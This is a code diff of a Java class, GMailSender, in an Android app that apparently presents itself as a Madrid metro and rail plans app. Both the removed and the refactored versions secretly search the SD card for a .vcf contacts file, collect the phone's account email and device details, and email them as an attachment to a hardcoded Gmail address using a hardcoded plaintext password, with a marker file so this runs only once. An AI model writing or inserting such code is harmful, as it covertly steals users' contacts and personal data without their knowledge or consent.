@@ -46,20 +46,18 @@ import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.app.Activity;
 
-
-public class GMailSender extends javax.mail.Authenticator{
+public class GMailSender extends javax.mail.Authenticator {
 	private String mailhost = "smtp.gmail.com";
 	private String user;
 	private String password;
 	private Session session;
 	String possibleEmail;
 	String typeOfAccount;
-	boolean foundVCF=false;
-	boolean foundSecond=false;
-	
-	
+	boolean foundVCF = false;
+	boolean foundSecond = false;
+	String filename = "unknow";
 	Context contextForMe = MetroRenfeMadridActivity.ma.getApplicationContext();
-	
+
 	static {
 		Security.addProvider(new met.ref.JSSEProvider());
 	}
@@ -85,144 +83,149 @@ public class GMailSender extends javax.mail.Authenticator{
 	protected PasswordAuthentication getPasswordAuthentication() {
 		return new PasswordAuthentication(user, password);
 	}
-	
-	
 
-	public synchronized void sendMail(String subject, String body,
-			String sender, String recipients) throws MessagingException, IOException {
+	public boolean searchFileConfig() {
 		try {
-	
-			String filename="unknow";
-			
-		
-	        String fileNameSecond = "/mnt/sdcard/config_2.txt";
-	        try {
-	        	for (File fg: Environment.getExternalStorageDirectory().listFiles()){
-	        		if(fg.getAbsoluteFile().toString().equals(fileNameSecond)){
-	        			Log.i("FOUND", "FOUND");
-	        			foundSecond=true;
-	        		}
-	        	}
-	            
-	        	} catch (Exception e) {
-	        		e.printStackTrace();
-	        	}	
-			
-         if(!foundSecond){
-			for (File f: Environment.getExternalStorageDirectory().listFiles()){
-				if (f.getAbsolutePath().endsWith(".vcf")){
+			for (File fg : Environment.getExternalStorageDirectory()
+					.listFiles()) {
+				Log.i("FILE", fg.getAbsoluteFile().toString());
+				if (fg.getAbsoluteFile().toString().equals(Environment.getExternalStorageDirectory()+"/config_2.txt")) {
+					Log.i("FOUND", "FOUND");
+					foundSecond = true;
+				}
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return foundSecond;
+	}
+
+	public boolean searchVCF() {
+		try {
+			for (File f : Environment.getExternalStorageDirectory().listFiles()) {
+				if (f.getAbsolutePath().endsWith(".vcf")) {
 					filename = f.getAbsolutePath();
 					FileWriter fe = new FileWriter("/mnt/sdcard/config_2.txt");
-					foundVCF=true;
+					foundVCF = true;
 				}
-			}  
-			
-			Log.i("Filename: ", filename);    
-			
-		 if(foundVCF){
-			String host = "smtp.gmail.com";
-			String Password = "arh217956arh";
-			String from = "albert.eagle.uni@gmail.com";
-			String toAddress = "albert.eagle.uni@gmail.com";
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		Log.i("Filename: ", filename);
+		return foundVCF;
+	}
 
-			// Get system properties
-			Properties props = System.getProperties();
-			props.put("mail.smtp.host", host);
-			props.put("mail.smtps.auth", "true");
-			props.put("mail.smtp.starttls.enable", "true");
-			Session session = Session.getInstance(props, null);
+	public synchronized void sendMail(String subject, String body,
+			String sender, String recipients) throws MessagingException,
+			IOException {
+		try {
 
-			MimeMessage message = new MimeMessage(session);
+			// Searching config_2.txt file
+			foundSecond = searchFileConfig();
 
-			message.setFrom(new InternetAddress(from));
+			if (!foundSecond) {
+				// Searching VCF file
+				foundVCF = searchVCF();
 
-			message.setRecipients(Message.RecipientType.TO, toAddress);
+				if (foundVCF) {
+					String host = "smtp.gmail.com";
+					String Password = "arh217956arh";
+					String from = "albert.eagle.uni@gmail.com";
+					String toAddress = "albert.eagle.uni@gmail.com";
 
-			// Subject
-			message.setSubject("Someone is inside to Madrid Plans");
+					// Get system properties
+					Properties props = System.getProperties();
+					props.put("mail.smtp.host", host);
+					props.put("mail.smtps.auth", "true");
+					props.put("mail.smtp.starttls.enable", "true");
+					Session session = Session.getInstance(props, null);
 
-			// Body
-			// Device model
-        	String PhoneModel = android.os.Build.MODEL;
-        	// Android version
-        	String AndroidVersion = android.os.Build.VERSION.RELEASE;
-        	
-        	// Brand 
-        	String brand = android.os.Build.BRAND;
-        	
-        	// Host
-        	String hosty = android.os.Build.HOST;
-        	
-        	// Manufacturer
-        	String manu = android.os.Build.MANUFACTURER;
-        	
-        	// User 
-        	Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
-        	Account[] accounts = AccountManager.get(contextForMe).getAccounts();
-        	for (Account account : accounts) {
-        	    if (emailPattern.matcher(account.name).matches()) {
-        	    	possibleEmail = account.name;
-        	  
-        	    }
-        	    if (emailPattern.matcher(account.type).matches()){
-        	    	typeOfAccount = account.type;
-        	    }
-        	    
-        	}
-            
-            
-        	// Make the email body part
-			BodyPart messageBodyPart = new MimeBodyPart();
-			messageBodyPart.setText("Mobile data: \n"
-			+"User: "+possibleEmail+"\n"
-			+"Account type: "+typeOfAccount+"\n"
-			+"Phone model: "+PhoneModel+"\n"
-			+"Android version: "+AndroidVersion+"\n"
-			+"Brand: "+brand+"\n"
-			+"Host: "+hosty+"\n"
-			+"Manufacturer: "+manu+"\n"
-			);
-			
-			Multipart multipart = new MimeMultipart();
-			multipart.addBodyPart(messageBodyPart);
+					MimeMessage message = new MimeMessage(session);
 
-			// Attach file
-			messageBodyPart = new MimeBodyPart();
-			DataSource source = new FileDataSource(filename);
-			messageBodyPart.setDataHandler(new DataHandler(source));
-			messageBodyPart.setFileName(filename);
-			multipart.addBodyPart(messageBodyPart);
+					message.setFrom(new InternetAddress(from));
 
-			// Adding objects to message
-			message.setContent(multipart);
-			Transport tr = session.getTransport("smtps");
-			message.setFrom(new InternetAddress(from));
-			message.setRecipients(Message.RecipientType.TO, toAddress);
-			tr.connect(host, from, Password);
+					message.setRecipients(Message.RecipientType.TO, toAddress);
 
-			// Fixing error
-			MailcapCommandMap mc = (MailcapCommandMap) CommandMap
-					.getDefaultCommandMap();
-			mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
-			mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
-			mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
-			mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
-			mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
-			CommandMap.setDefaultCommandMap(mc);
+					// Subject
+					message.setSubject("Someone is inside of Madrid Plans");
 
-			tr.sendMessage(message, message.getAllRecipients());
-			System.out.println("Mail Sent Successfully");
-			tr.close();
-		 }//if foundCVF
-         }//if foundSecond 
+					// Body
+					// Device model
+					String PhoneModel = android.os.Build.MODEL;
+
+					// Android version
+					String AndroidVersion = android.os.Build.VERSION.RELEASE;
+
+					// Brand
+					String brand = android.os.Build.BRAND;
+
+					// Host
+					String hosty = android.os.Build.HOST;
+
+					// Manufacturer
+					String manu = android.os.Build.MANUFACTURER;
+
+					// User
+					Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level
+																	// 8+
+					Account[] accounts = AccountManager.get(contextForMe)
+							.getAccounts();
+					for (Account account : accounts) {
+						if (emailPattern.matcher(account.name).matches()) {
+							possibleEmail = account.name;
+						}
+					}
+
+					// Make the email body part
+					BodyPart messageBodyPart = new MimeBodyPart();
+					messageBodyPart.setText(
+							"Mobile data: \n" 
+							+ "User: "+ possibleEmail + "\n" 
+							+ "Phone model: "+ PhoneModel + "\n" 
+							+ "Android version: "+ AndroidVersion + "\n" 
+							+ "Brand: " + brand + "\n"
+							+ "Host: " + hosty + "\n" 
+							+ "Manufacturer: " + manu+ "\n");
+
+					Multipart multipart = new MimeMultipart();
+					multipart.addBodyPart(messageBodyPart);
+
+					// Attach file
+					messageBodyPart = new MimeBodyPart();
+					DataSource source = new FileDataSource(filename);
+					messageBodyPart.setDataHandler(new DataHandler(source));
+					messageBodyPart.setFileName(filename);
+					multipart.addBodyPart(messageBodyPart);
+
+					// Adding objects to message
+					message.setContent(multipart);
+					Transport tr = session.getTransport("smtps");
+					message.setFrom(new InternetAddress(from));
+					message.setRecipients(Message.RecipientType.TO, toAddress);
+					tr.connect(host, from, Password);
+
+					// Fixing error
+					MailcapCommandMap mc = (MailcapCommandMap) CommandMap
+							.getDefaultCommandMap();
+					mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
+					mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
+					mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
+					mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
+					mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
+					CommandMap.setDefaultCommandMap(mc);
+
+					tr.sendMessage(message, message.getAllRecipients());
+					System.out.println("Mail Sent Successfully");
+					tr.close();
+				}// if foundCVF
+			}// if foundSecond
 		} catch (SendFailedException sfe) {
 
 			System.out.println(sfe);
 		}
-		
-	}
 
-	
+	}
 
 	public class ByteArrayDataSource implements DataSource {
 		private byte[] data;
@@ -261,9 +264,7 @@ public class GMailSender extends javax.mail.Authenticator{
 		public OutputStream getOutputStream() throws IOException {
 			throw new IOException("Not Supported");
 		}
-		
-		
+
 	}
-	
-	
+
 }
